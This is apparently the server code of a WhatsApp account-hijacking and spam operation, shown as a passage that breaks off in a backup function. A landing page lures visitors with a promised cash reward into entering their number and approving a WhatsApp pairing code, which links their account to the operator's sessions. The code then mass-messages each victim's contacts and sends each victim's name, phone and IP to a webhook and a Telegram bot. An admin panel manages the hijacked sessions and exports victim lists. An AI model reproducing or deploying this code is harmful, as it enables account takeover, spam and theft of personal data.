const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const wppconnect = require('@wppconnect-team/wppconnect');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const db = require('./database');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = 3000;
const SERVER_START_TIME = Date.now();

// Load config
function loadConfig() {
    return JSON.parse(fs.readFileSync('./config.json', 'utf-8'));
}
function saveConfig(config) {
    fs.writeFileSync('./config.json', JSON.stringify(config, null, 4));
}

// Auto-generate JWT secret on first run
(function ensureJwtSecret() {
    const config = loadConfig();
    if (!config.jwtSecret) {
        config.jwtSecret = crypto.randomBytes(32).toString('hex');
        saveConfig(config);
        console.log('[Auth] JWT secret generated');
    }
})();

// Middleware
app.use(cookieParser());
app.use(express.json());

// Maintenance mode middleware (before static files)
app.use((req, res, next) => {
    const config = loadConfig();
    if (config.maintenanceMode) {
        // Allow admin, health, and API endpoints through
        if (req.path.startsWith('/admin') || req.path === '/health' || req.path.startsWith('/api')) {
            return next();
        }
        return res.sendFile(path.join(__dirname, 'public', 'maintenance.html'));
    }
    next();
});

// Serve static files
app.use(express.static('public'));

// ==================== STATE ====================
// Multi-session: Map<sessionId, SessionData>
const sessions = new Map();
let onlineCount = 0;

// Rate limit map: IP -> [timestamps]
const rateLimitMap = new Map();

// Connection time tracking (last 100 connection times in ms)
const connectionTimes = [];

// Session data structure:
// { id, client, phone, status, userInfo, connectedAt, ip, socketId, broadcastDone, startedAt }

// ==================== RATE LIMITING ====================
function getFingerprint(socket) {
    const ip = socket.handshake.address;
    const ua = socket.handshake.headers['user-agent'] || '';
    return `${ip}|${ua.slice(0, 50)}`;
}

function checkRateLimit(socket) {
    const config = loadConfig();
    const now = Date.now();
    const window = config.rateLimitWindowMs || 3600000;
    const maxAttempts = config.rateLimitMaxAttempts || 3;
    const fingerprint = getFingerprint(socket);

    if (!rateLimitMap.has(fingerprint)) {
        rateLimitMap.set(fingerprint, []);
    }

    const timestamps = rateLimitMap.get(fingerprint).filter(t => now - t < window);
    rateLimitMap.set(fingerprint, timestamps);

    if (timestamps.length >= maxAttempts) {
        return false;
    }

    timestamps.push(now);
    return true;
}

// ==================== STATS ====================
function loadStats() {
    try {
        if (fs.existsSync('./stats.json')) {
            return JSON.parse(fs.readFileSync('./stats.json', 'utf-8'));
        }
    } catch (e) { }
    return { visits: 0, broadcasts: 0, sent: 0, failed: 0, logs: [] };
}

function saveStats(stats) {
    if (stats.logs.length > 200) stats.logs = stats.logs.slice(0, 200);
    fs.writeFileSync('./stats.json', JSON.stringify(stats, null, 2));
}

function addStatsLog(type, message) {
    const stats = loadStats();
    stats.logs.unshift({
        timestamp: new Date().toLocaleString('pt-BR'),
        type,
        message
    });
    saveStats(stats);
}

// ==================== WEBHOOK ====================
async function sendWebhook(data) {
    const config = loadConfig();
    if (!config.webhookUrl) return;

    try {
        const response = await fetch(config.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🟢 **Nova Conexão!**\n👤 Nome: ${data.name}\n📱 Número: ${data.phone}\n🌐 IP: ${data.ip}\n⏰ Hora: ${new Date().toLocaleString('pt-BR')}`
            })
        });
        console.log('[Webhook] Sent:', response.status);
    } catch (err) {
        console.error('[Webhook] Error:', err.message);
    }
}

// ==================== TELEGRAM NOTIFICATIONS ====================
async function sendTelegram(message) {
    const config = loadConfig();
    if (!config.telegramBotToken || !config.telegramChatId) return;

    try {
        const url = `https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: config.telegramChatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (err) {
        console.error('[Telegram] Error:', err.message);
    }
}

// ==================== JWT AUTH ====================
function getJwtSecret() {
    return loadConfig().jwtSecret || 'fallback-secret-change-me';
}

function adminAuth(req, res, next) {
    const config = loadConfig();

    // 1. Check JWT cookie
    const token = req.cookies?.admin_token;
    if (token) {
        try {
            jwt.verify(token, getJwtSecret());
            req.adminAuthenticated = true;
            return next();
        } catch (e) { /* invalid token, try next method */ }
    }

    // 2. Backward compat: check ?key= param
    if (req.query.key === config.adminPassword) {
        req.adminAuthenticated = true;
        return next();
    }

    return res.status(401).send('Unauthorized');
}

// ==================== IP SESSION TRACKING ====================
function countSessionsByIp(ip) {
    let count = 0;
    for (const [, session] of sessions) {
        if (session.ip === ip && (session.status === 'connecting' || session.status === 'connected')) {
            count++;
        }
    }
    return count;
}

// ==================== HEALTH CHECK ====================
app.get('/health', (req, res) => {
    const mem = process.memoryUsage();
    let dbOk = true;
    try { db.getStats(); } catch (e) { dbOk = false; }

    res.json({
        status: 'ok',
        uptime: Math.floor((Date.now() - SERVER_START_TIME) / 1000),
        uptimeHuman: formatUptime(Date.now() - SERVER_START_TIME),
        memory: {
            rss: (mem.rss / 1024 / 1024).toFixed(1) + ' MB',
            heapUsed: (mem.heapUsed / 1024 / 1024).toFixed(1) + ' MB',
            heapTotal: (mem.heapTotal / 1024 / 1024).toFixed(1) + ' MB'
        },
        activeSessions: sessions.size,
        connectedSessions: [...sessions.values()].filter(s => s.status === 'connected').length,
        onlineVisitors: onlineCount,
        database: dbOk ? 'ok' : 'error',
        timestamp: new Date().toISOString()
    });
});

function formatUptime(ms) {
    const s = Math.floor(ms / 1000);
    const d = Math.floor(s / 86400);
    const h = Math.floor((s % 86400) / 3600);
    const m = Math.floor((s % 3600) / 60);
    if (d > 0) return `${d}d ${h}h ${m}m`;
    if (h > 0) return `${h}h ${m}m`;
    return `${m}m`;
}

// ==================== SOCKET.IO ====================
io.on('connection', (socket) => {
    onlineCount++;
    io.emit('online_count', onlineCount);
    db.addLog('VISIT', `Novo acesso (IP: ${socket.handshake.address})`);
    console.log(`[Socket] Connected (Online: ${onlineCount})`);

    // Track visits
    try {
        const stats = loadStats();
        stats.visits = (stats.visits || 0) + 1;
        saveStats(stats);
    } catch (e) { }

    // PAIRING CODE REQUEST (with rate limiting + fingerprint)
    socket.on('req_pairing_code', async (phoneNumber) => {
        const ip = socket.handshake.address;

        if (!checkRateLimit(socket)) {
            socket.emit('rate_limited', 'Muitas tentativas. Aguarde 1 hora.');
            db.addLog('RATE_LIMIT', `Bloqueado: ${ip}`);
            return;
        }

        // IP session limit
        const config = loadConfig();
        const maxPerIp = config.maxSessionsPerIp || 2;
        if (countSessionsByIp(ip) >= maxPerIp) {
            socket.emit('rate_limited', `Limite de ${maxPerIp} sessões por IP atingido.`);
            db.addLog('IP_LIMIT', `Bloqueado: ${ip} (${maxPerIp} sessões)`);
            return;
        }

        console.log(`[Pairing] Request for ${phoneNumber} from ${ip}`);
        db.addLog('PAIRING', `Código solicitado: ${phoneNumber} (IP: ${ip})`);

        // Create a unique session for this user
        const sessionId = `session-${phoneNumber}-${Date.now()}`;
        startSession(sessionId, phoneNumber, ip, socket);
    });

    socket.on('disconnect', () => {
        onlineCount = Math.max(0, onlineCount - 1);
        io.emit('online_count', onlineCount);
        console.log(`[Socket] Disconnected (Online: ${onlineCount})`);
    });
});

// ==================== API ENDPOINTS ====================

// Frontend config
app.get('/api/config', (req, res) => {
    const config = loadConfig();
    res.json({ rewardValue: config.rewardValue, conversionLink: config.conversionLink || '', facebookPixelId: config.facebookPixelId || '' });
});

// ==================== ADMIN LOGIN ====================
app.get('/admin/login', (req, res) => {
    res.send(`
        <!DOCTYPE html><html><head><meta charset="UTF-8"><title>Admin Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body{background:#0d121b;color:#fff;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
            .login-box{background:rgba(255,255,255,0.05);padding:40px;border-radius:16px;text-align:center;border:1px solid rgba(255,255,255,0.06);max-width:360px;width:100%;}
            h2{color:#00ff88;margin-bottom:20px;}
            input{padding:14px;border-radius:10px;border:1px solid #333;background:#1b2838;color:#fff;font-size:1em;margin:10px 0;width:100%;box-sizing:border-box;}
            button{padding:14px;border-radius:10px;border:none;background:#00ff88;color:#000;font-weight:bold;cursor:pointer;font-size:1em;width:100%;margin-top:10px;}
            button:hover{background:#00e07a;}
            .error{color:#ff4444;margin-top:10px;font-size:0.85em;display:none;}
        </style>
        </head><body>
        <div class="login-box">
            <h2>🔐 Admin</h2>
            <form id="loginForm">
                <input name="password" type="password" placeholder="Senha" id="passInput" autofocus>
                <button type="submit">Entrar</button>
                <div class="error" id="errorMsg">Senha incorreta</div>
            </form>
        </div>
        <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const pass = document.getElementById('passInput').value;
            const res = await fetch('/admin/login', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({password: pass})
            });
            if (res.ok) {
                window.location.href = '/admin';
            } else {
                document.getElementById('errorMsg').style.display = 'block';
            }
        });
        </script>
        </body></html>
    `);
});

app.post('/admin/login', (req, res) => {
    const config = loadConfig();
    const { password } = req.body;

    if (password !== config.adminPassword) {
        return res.status(401).json({ error: 'Invalid password' });
    }

    const token = jwt.sign({ role: 'admin' }, getJwtSecret(), { expiresIn: '24h' });
    res.cookie('admin_token', token, {
        httpOnly: true,
        secure: false, // Set true if using HTTPS
        maxAge: 24 * 60 * 60 * 1000,
        sameSite: 'lax'
    });
    res.json({ ok: true });
});

app.get('/admin/logout', (req, res) => {
    res.clearCookie('admin_token');
    res.redirect('/admin/login');
});

// ==================== ADMIN PANEL ====================
app.get('/admin', (req, res) => {
    const config = loadConfig();

    // Check JWT cookie first, then ?key= fallback
    let authenticated = false;
    const token = req.cookies?.admin_token;
    if (token) {
        try { jwt.verify(token, getJwtSecret()); authenticated = true; } catch (e) { }
    }
    if (!authenticated && req.query.key === config.adminPassword) {
        authenticated = true;
    }

    if (!authenticated) {
        return res.redirect('/admin/login');
    }

    const stats = db.getStats();
    const connections = db.getConnections(20);
    const logs = db.getLogs(30);
    const dailyStats = db.getConnectionsByDay ? db.getConnectionsByDay(7) : [];

    // Calculate average connection time
    let avgTimeStr = '-';
    if (connectionTimes.length > 0) {
        const avg = connectionTimes.reduce((a, b) => a + b, 0) / connectionTimes.length;
        const secs = Math.round(avg / 1000);
        avgTimeStr = secs < 60 ? `${secs}s` : `${Math.floor(secs / 60)}m ${secs % 60}s`;
    }

    // Sessions info
    const sessionsArray = [];
    for (const [id, s] of sessions) {
        sessionsArray.push({
            id,
            phone: s.phone || '-',
            status: s.status,
            name: s.userInfo?.name || '-',
            connectedAt: s.connectedAt || '-',
            broadcastDone: s.broadcastDone || false
        });
    }

    const sessionsHtml = sessionsArray.length > 0
        ? sessionsArray.map(s => `
            <tr>
                <td><span style="color:${s.status === 'connected' ? '#00ff88' : s.status === 'connecting' ? '#ffaa00' : '#ff4444'}">●</span> ${s.status}</td>
                <td>${s.phone}</td>
                <td>${s.name}</td>
                <td>${s.connectedAt}</td>
                <td>${s.broadcastDone ? '✅' : '⏳'}</td>
                <td>
                    <button class="btn btn-danger" style="padding:5px 10px;font-size:0.8em;" onclick="adminAction('/admin/session/disconnect?id=${s.id}')">🔌</button>
                    <button class="btn btn-info" style="padding:5px 10px;font-size:0.8em;" onclick="adminAction('/admin/session/broadcast?id=${s.id}')">📢</button>
                </td>
            </tr>
        `).join('')
        : '<tr><td colspan="6" style="text-align:center;color:#666;">Nenhuma sessão ativa</td></tr>';

    const connectionsHtml = connections.map(c => `
        <tr>
            <td>${c.name || '-'}</td>
            <td>${c.phone || '-'}</td>
            <td>${c.ip || '-'}</td>
            <td>${c.connected_at}</td>
        </tr>
    `).join('');

    const logsHtml = logs.map(log => `
        <div style="border-bottom:1px solid #222;padding:8px;display:flex;justify-content:space-between;gap:10px;">
            <span style="color:#00ff88;font-weight:bold;white-space:nowrap;">[${log.type}]</span>
            <span style="color:#ccc;flex:1;">${log.message}</span>
            <span style="color:#666;font-size:0.8em;white-space:nowrap;">${log.created_at}</span>
        </div>
    `).join('');

    const dailyHtml = dailyStats.map(d => {
        const barWidth = Math.max(d.count * 20, 5);
        return `<div style="display:flex;align-items:center;gap:10px;margin:4px 0;">
            <span style="color:#888;font-size:0.8em;min-width:80px;">${d.date}</span>
            <div style="background:#00ff88;height:18px;width:${barWidth}px;border-radius:4px;"></div>
            <span style="color:#fff;font-size:0.8em;">${d.count}</span>
        </div>`;
    }).join('');

    const blacklist = config.blacklist || [];
    const blacklistHtml = blacklist.length > 0
        ? blacklist.map(n => `<span style="background:#ff4444;padding:3px 8px;border-radius:4px;font-size:0.8em;margin:2px;">${n} <a href="#" onclick="adminAction('/admin/blacklist/remove?number=${n}');return false;" style="color:#fff;">✕</a></span>`).join(' ')
        : '<span style="color:#666;">Nenhum número bloqueado</span>';

    const mem = process.memoryUsage();
    const uptimeStr = formatUptime(Date.now() - SERVER_START_TIME);

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Admin Dashboard</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                * { box-sizing: border-box; }
                body { background: #0d121b; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px; margin: 0; }
                h1 { color: #00ff88; margin-bottom: 5px; }
                h2 { color: #00ff88; margin-top: 0; }
                .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 15px; margin: 20px 0; }
                .stat-card { background: #1b2838; padding: 20px; border-radius: 12px; text-align: center; }
                .stat-value { font-size: 2em; font-weight: bold; color: #00ff88; }
                .stat-label { color: #888; text-transform: uppercase; font-size: 0.75em; margin-top: 5px; }
                .card { background: rgba(255,255,255,0.03); padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #1b2838; }
                table { width: 100%; border-collapse: collapse; font-size: 0.85em; }
                th { text-align: left; color: #00ff88; padding: 8px; border-bottom: 1px solid #333; }
                td { padding: 8px; border-bottom: 1px solid #1b2838; color: #ccc; }
                .btn { padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 0.9em; margin: 5px; }
                .btn-danger { background: #ff4444; color: #fff; }
                .btn-success { background: #00ff88; color: #000; }
                .btn-info { background: #00b8ff; color: #fff; }
                .btn-warn { background: #ffaa00; color: #000; }
                input, textarea { padding: 10px; border-radius: 8px; border: 1px solid #333; background: #1b2838; color: #fff; font-size: 0.9em; width: 100%; margin: 5px 0; }
                textarea { min-height: 60px; resize: vertical; }
                .config-row { display: flex; gap: 10px; align-items: center; margin: 8px 0; flex-wrap: wrap; }
                .config-row label { min-width: 120px; color: #aaa; font-size: 0.85em; }
                .config-row input, .config-row textarea { flex: 1; min-width: 200px; }
                .topbar { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
                .topbar-info { color: #888; font-size: 0.8em; }
                .toggle-btn { padding: 8px 16px; border-radius: 8px; border: none; cursor: pointer; font-weight: bold; font-size: 0.8em; }
                .toggle-on { background: #ff4444; color: #fff; }
                .toggle-off { background: #00ff88; color: #000; }
                .live-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #00ff88; animation: blink 1.5s infinite; margin-right: 4px; }
                @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
            </style>
        </head>
        <body>
            <div class="topbar">
                <div>
                    <h1>🤖 Painel Admin</h1>
                    <div class="topbar-info">
                        <span class="live-dot"></span> Ao vivo | Uptime: ${uptimeStr} | RAM: ${(mem.rss / 1024 / 1024).toFixed(0)}MB
                    </div>
                </div>
                <div>
                    <button class="toggle-btn ${config.maintenanceMode ? 'toggle-on' : 'toggle-off'}" onclick="adminAction('/admin/maintenance/toggle')" id="maint-btn">
                        ${config.maintenanceMode ? '🔧 Manutenção LIGADA' : '✅ Site Online'}
                    </button>
                    <a href="/admin/logout" class="btn btn-danger" style="text-decoration:none;font-size:0.8em;">🚪 Sair</a>
                </div>
            </div>

            <div class="grid" id="stats-grid">
                <div class="stat-card">
                    <div class="stat-value" id="sv-sessions">${sessionsArray.filter(s => s.status === 'connected').length}</div>
                    <div class="stat-label">Sessões Ativas</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="sv-online">${onlineCount}</div>
                    <div class="stat-label">No Site Agora</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">${stats.totalConnections}</div>
                    <div class="stat-label">Total Conexões</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">${stats.todayConnections}</div>
                    <div class="stat-label">Conexões Hoje</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">${avgTimeStr}</div>
                    <div class="stat-label">⏱️ Tempo Médio</div>
                </div>
            </div>

            <!-- SESSIONS -->
            <div class="card">
                <h2>📱 Sessões WhatsApp</h2>
                <table>
                    <tr><th>Status</th><th>Número</th><th>Nome</th><th>Conectou</th><th>Broadcast</th><th>Ações</th></tr>
                    <tbody id="sessions-tbody">${sessionsHtml}</tbody>
                </table>
                <div style="margin-top:10px;">
                    <button class="btn btn-info" onclick="adminAction('/admin/broadcast-all')">📢 Broadcast TODAS</button>
                    <button class="btn btn-danger" onclick="if(confirm('Desconectar TODAS?'))adminAction('/admin/disconnect-all')">🔌 Desconectar TODAS</button>
                    <button class="btn btn-warn" onclick="adminAction('/admin/cleanup')">🧹 Limpar Sessões</button>
                    <button class="btn btn-success" onclick="adminAction('/admin/backup/run')">💾 Backup Agora</button>
                </div>
            </div>

            <!-- CONFIG -->
            <div class="card">
                <h2>⚙️ Configuração</h2>
                <form onsubmit="event.preventDefault(); saveConfig();">
                    <div class="config-row"><label>📢 Mensagem Broadcast</label><textarea id="cfg-msg">${(config.broadcastMessage || '').replace(/"/g, '&quot;')}</textarea></div>
                    <div class="config-row"><label>📢 Limite por sessão</label><input id="cfg-limit" type="number" value="${config.broadcastLimit || 50}"></div>
                    <div class="config-row"><label>💰 Valor da Banca</label><input id="cfg-reward" value="${config.rewardValue || '30,00'}"></div>
                    <div class="config-row"><label>👋 Welcome Msg</label><textarea id="cfg-welcome">${(config.welcomeMessage || '').replace(/"/g, '&quot;')}</textarea></div>
                    <div class="config-row"><label>🔗 Webhook URL</label><input id="cfg-webhook" value="${config.webhookUrl || ''}"></div>
                    <div class="config-row"><label>⏰ Broadcast horário</label><input id="cfg-schedule" placeholder="19:00 (vazio = só auto)" value="${config.scheduledTime || ''}"></div>
                    <div class="config-row"><label>🔗 Link Conversão</label><input id="cfg-link" placeholder="https://seu-link-de-afiliado.com" value="${config.conversionLink || ''}"></div>
                    <div class="config-row"><label>📊 Facebook Pixel</label><input id="cfg-pixel" placeholder="ID do Pixel" value="${config.facebookPixelId || ''}"></div>
                    <div class="config-row"><label>🤖 Telegram Bot Token</label><input id="cfg-tg-token" placeholder="123456:ABCdef..." value="${config.telegramBotToken || ''}"></div>
                    <div class="config-row"><label>💬 Telegram Chat ID</label><input id="cfg-tg-chat" placeholder="-1001234567890" value="${config.telegramChatId || ''}"></div>
                    <div class="config-row"><label>🔒 Max Sessões/IP</label><input id="cfg-max-ip" type="number" value="${config.maxSessionsPerIp || 2}"></div>
                    <button class="btn btn-success" type="submit">💾 Salvar</button>
                    <button class="btn btn-info" type="button" onclick="adminAction('/admin/telegram/test')">📱 Testar Telegram</button>
                </form>
            </div>

            <!-- PASSWORD CHANGE -->
            <div class="card">
                <h2>🔐 Alterar Senha</h2>
                <form onsubmit="event.preventDefault(); changePassword();">
                    <div class="config-row"><label>Senha atual</label><input id="pw-old" type="password" placeholder="Senha atual"></div>
                    <div class="config-row"><label>Nova senha</label><input id="pw-new" type="password" placeholder="Nova senha"></div>
                    <div class="config-row"><label>Confirmar</label><input id="pw-confirm" type="password" placeholder="Confirmar nova senha"></div>
                    <button class="btn btn-warn" type="submit">🔐 Alterar Senha</button>
                </form>
            </div>

            <!-- BLACKLIST -->
            <div class="card">
                <h2>🚫 Blacklist</h2>
                <div style="margin-bottom:10px;">${blacklistHtml}</div>
                <div style="display:flex;gap:10px;">
                    <input id="bl-num" placeholder="5511999999999" style="flex:1;">
                    <button class="btn btn-danger" onclick="adminAction('/admin/blacklist/add?number='+document.getElementById('bl-num').value)">+ Bloquear</button>
                </div>
            </div>

            <!-- DAILY CHART -->
            <div class="card">
                <h2>📈 Conexões (7 dias)</h2>
                ${dailyHtml || '<p style="color:#666;">Sem dados ainda</p>'}
            </div>

            <!-- CONNECTIONS -->
            <div class="card">
                <h2>📊 Conexões Recentes</h2>
                <div style="margin-bottom:10px;">
                    <a class="btn btn-success" href="/admin/export" style="text-decoration:none;font-size:0.8em;">📥 Exportar CSV</a>
                    <a class="btn btn-info" href="/admin/backup/download" style="text-decoration:none;font-size:0.8em;">💾 Download Backup</a>
                </div>
                <table>
                    <tr><th>Nome</th><th>Número</th><th>IP</th><th>Data</th></tr>
                    ${connectionsHtml || '<tr><td colspan="4" style="text-align:center;color:#666;">Nenhuma conexão ainda</td></tr>'}
                </table>
            </div>

            <!-- LOGS -->
            <div class="card">
                <h2>📜 Logs</h2>
                <div id="logs-container" style="background:#000;border-radius:8px;overflow:hidden;max-height:400px;overflow-y:auto;">
                    ${logsHtml || '<p style="padding:15px;color:#666;text-align:center;">Sem logs</p>'}
                </div>
            </div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
            // Admin helper function (uses cookies, no ?key= needed)
            async function adminAction(url) {
                try {
                    const res = await fetch(url);
                    const text = await res.text();
                    if (!res.ok && res.status === 401) {
                        window.location.href = '/admin/login';
                        return;
                    }
                    alert(text);
                    location.reload();
                } catch(e) { alert('Erro: ' + e.message); }
            }

            async function changePassword() {
                const oldPw = document.getElementById('pw-old').value;
                const newPw = document.getElementById('pw-new').value;
                const confirmPw = document.getElementById('pw-confirm').value;
                if (newPw !== confirmPw) { alert('As senhas não coincidem!'); return; }
                if (newPw.length < 4) { alert('Senha muito curta (mínimo 4 caracteres)'); return; }
                try {
                    const res = await fetch('/admin/password', {
                        method: 'POST',
                        headers: {'Content-Type':'application/json'},
                        body: JSON.stringify({ oldPassword: oldPw, newPassword: newPw })
                    });
                    const text = await res.text();
                    alert(text);
                    if (res.ok) window.location.href = '/admin/login';
                } catch(e) { alert('Erro: ' + e.message); }
            }

            async function saveConfig() {
                const data = {
                    broadcastMessage: document.getElementById('cfg-msg').value,
                    broadcastLimit: parseInt(document.getElementById('cfg-limit').value),
                    rewardValue: document.getElementById('cfg-reward').value,
                    welcomeMessage: document.getElementById('cfg-welcome').value,
                    webhookUrl: document.getElementById('cfg-webhook').value,
                    scheduledTime: document.getElementById('cfg-schedule').value,
                    conversionLink: document.getElementById('cfg-link').value,
                    facebookPixelId: document.getElementById('cfg-pixel').value,
                    telegramBotToken: document.getElementById('cfg-tg-token').value,
                    telegramChatId: document.getElementById('cfg-tg-chat').value,
                    maxSessionsPerIp: parseInt(document.getElementById('cfg-max-ip').value) || 2
                };
                const res = await fetch('/admin/config', {
                    method: 'POST',
                    headers: {'Content-Type':'application/json'},
                    body: JSON.stringify(data)
                });
                const text = await res.text();
                alert(text);
                if (!res.ok && res.status === 401) window.location.href = '/admin/login';
            }

            // ===== WEBSOCKET REAL-TIME UPDATES =====
            const socket = io();
            socket.on('admin_update', (data) => {
                if (data.onlineCount !== undefined) {
                    const el = document.getElementById('sv-online');
                    if (el) el.textContent = data.onlineCount;
                }
                if (data.activeSessions !== undefined) {
                    const el = document.getElementById('sv-sessions');
                    if (el) el.textContent = data.activeSessions;
                }
                if (data.newLog) {
                    const container = document.getElementById('logs-container');
                    if (container) {
                        const div = document.createElement('div');
                        div.style.cssText = 'border-bottom:1px solid #222;padding:8px;display:flex;justify-content:space-between;gap:10px;animation:fadeIn 0.3s';
                        div.innerHTML = '<span style="color:#00ff88;font-weight:bold;white-space:nowrap;">[' + data.newLog.type + ']</span>'
                            + '<span style="color:#ccc;flex:1;">' + data.newLog.message + '</span>'
                            + '<span style="color:#666;font-size:0.8em;white-space:nowrap;">' + data.newLog.time + '</span>';
                        container.insertBefore(div, container.firstChild);
                    }
                }
            });
            </script>
        </body>
        </html>
    `);
});

// ==================== ADMIN API ====================

// Emit admin update to all connected clients
function emitAdminUpdate(data) {
    io.emit('admin_update', data);
}

// Save config
app.post('/admin/config', adminAuth, (req, res) => {
    const config = loadConfig();
    const updates = req.body;
    if (updates.broadcastMessage !== undefined) config.broadcastMessage = updates.broadcastMessage;
    if (updates.broadcastLimit !== undefined) config.broadcastLimit = parseInt(updates.broadcastLimit) || 50;
    if (updates.rewardValue !== undefined) config.rewardValue = updates.rewardValue;
    if (updates.welcomeMessage !== undefined) config.welcomeMessage = updates.welcomeMessage;
    if (updates.webhookUrl !== undefined) config.webhookUrl = updates.webhookUrl;
    if (updates.scheduledTime !== undefined) config.scheduledTime = updates.scheduledTime;
    if (updates.conversionLink !== undefined) config.conversionLink = updates.conversionLink;
    if (updates.facebookPixelId !== undefined) config.facebookPixelId = updates.facebookPixelId;
    if (updates.telegramBotToken !== undefined) config.telegramBotToken = updates.telegramBotToken;
    if (updates.telegramChatId !== undefined) config.telegramChatId = updates.telegramChatId;
    if (updates.maxSessionsPerIp !== undefined) config.maxSessionsPerIp = parseInt(updates.maxSessionsPerIp) || 2;

    saveConfig(config);
    db.addLog('ADMIN', 'Configuração atualizada');
    res.send('Configuração salva!');
});

// Password change
app.post('/admin/password', adminAuth, (req, res) => {
    const config = loadConfig();
    const { oldPassword, newPassword } = req.body;

    if (oldPassword !== config.adminPassword) {
        return res.status(400).send('Senha atual incorreta!');
    }
    if (!newPassword || newPassword.length < 4) {
        return res.status(400).send('Nova senha muito curta (mínimo 4 caracteres)');
    }

    config.adminPassword = newPassword;
    // Regenerate JWT secret to invalidate all existing sessions
    config.jwtSecret = crypto.randomBytes(32).toString('hex');
    saveConfig(config);

    res.clearCookie('admin_token');
    db.addLog('ADMIN', 'Senha administrativa alterada');
    sendTelegram('🔐 <b>Senha admin alterada!</b>');
    res.send('Senha alterada! Faça login novamente.');
});

// Blacklist add
app.get('/admin/blacklist/add', adminAuth, (req, res) => {
    const config = loadConfig();
    const number = (req.query.number || '').replace(/\D/g, '');
    if (!number) return res.send('Número inválido');
    if (!config.blacklist) config.blacklist = [];
    if (!config.blacklist.includes(number)) {
        config.blacklist.push(number);
        saveConfig(config);
        db.addLog('BLACKLIST', `Adicionado: ${number}`);
    }
    res.send('Bloqueado: ' + number);
});

// Blacklist remove
app.get('/admin/blacklist/remove', adminAuth, (req, res) => {
    const config = loadConfig();
    const number = req.query.number || '';
    if (!config.blacklist) config.blacklist = [];
    config.blacklist = config.blacklist.filter(n => n !== number);
    saveConfig(config);
    db.addLog('BLACKLIST', `Removido: ${number}`);
    res.send('Removido: ' + number);
});

// Disconnect single session
app.get('/admin/session/disconnect', adminAuth, (req, res) => {
    const id = req.query.id;
    const session = sessions.get(id);
    if (session && session.client) {
        session.client.logout().catch(() => { });
        session.client.close().catch(() => { });
        sessions.delete(id);
        db.addLog('ADMIN', `Sessão ${session.phone} desconectada`);
        emitAdminUpdate({ activeSessions: [...sessions.values()].filter(s => s.status === 'connected').length });
    }
    res.send('Desconectado');
});

// Broadcast single session
app.get('/admin/session/broadcast', adminAuth, async (req, res) => {
    const config = loadConfig();
    const id = req.query.id;
    const session = sessions.get(id);
    if (!session || !session.client) return res.status(503).send('Sessão não encontrada');
    const result = await runBroadcast(session.client, config.broadcastMessage, config.broadcastLimit, session.phone);
    res.send(result);
});

// Broadcast ALL sessions
app.get('/admin/broadcast-all', adminAuth, async (req, res) => {
    const config = loadConfig();
    const results = [];
    for (const [id, session] of sessions) {
        if (session.status === 'connected' && session.client) {
            const result = await runBroadcast(session.client, config.broadcastMessage, config.broadcastLimit, session.phone);
            results.push(`${session.phone}: ${result}`);
        }
    }
    res.send(results.join('\n') || 'Nenhuma sessão ativa');
});

// Disconnect ALL sessions
app.get('/admin/disconnect-all', adminAuth, (req, res) => {
    for (const [id, session] of sessions) {
        if (session.client) {
            session.client.logout().catch(() => { });
            session.client.close().catch(() => { });
        }
    }
    sessions.clear();
    db.addLog('ADMIN', 'Todas as sessões desconectadas');
    emitAdminUpdate({ activeSessions: 0 });
    res.send('Todas desconectadas');
});

// Export CSV
app.get('/admin/export', adminAuth, (req, res) => {
    const connections = db.getConnections(10000);
    const csv = 'Nome,Numero,IP,Data\n' + connections.map(c =>
        `"${(c.name || '').replace(/"/g, '""')}","${c.phone || ''}","${c.ip || ''}","${c.connected_at}"`
    ).join('\n');

    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=conexoes.csv');
    res.send(csv);
});

// ==================== MAINTENANCE MODE ====================
app.get('/admin/maintenance/toggle', adminAuth, (req, res) => {
    const config = loadConfig();
    config.maintenanceMode = !config.maintenanceMode;
    saveConfig(config);
    const status = config.maintenanceMode ? 'LIGADA' : 'DESLIGADA';
    db.addLog('ADMIN', `Manutenção ${status}`);
    sendTelegram(`🔧 Modo manutenção ${status}`);
    res.send(`Manutenção ${status}`);
});

// ==================== TELEGRAM TEST ====================
app.get('/admin/telegram/test', adminAuth, async (req, res) => {
    const config = loadConfig();
    if (!config.telegramBotToken || !config.telegramChatId) {
        return res.send('Configure o Bot Token e Chat ID primeiro!');
    }
    await sendTelegram('✅ <b>Teste de Notificação</b>\nSeu bot está funcionando!');
    res.send('Mensagem de teste enviada para o Telegram!');
});

// ==================== BACKUP SYSTEM ====================
function runBackup() {
    const backupDir = path.join(__dirname, 'backups');
    if (!fs.existsSync(backupDir)) fs.mkdirSync(backupDir, { recursive: true });

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);

    // Copy database
    const dbSrc = path.join(__dirname, 'bot.db');
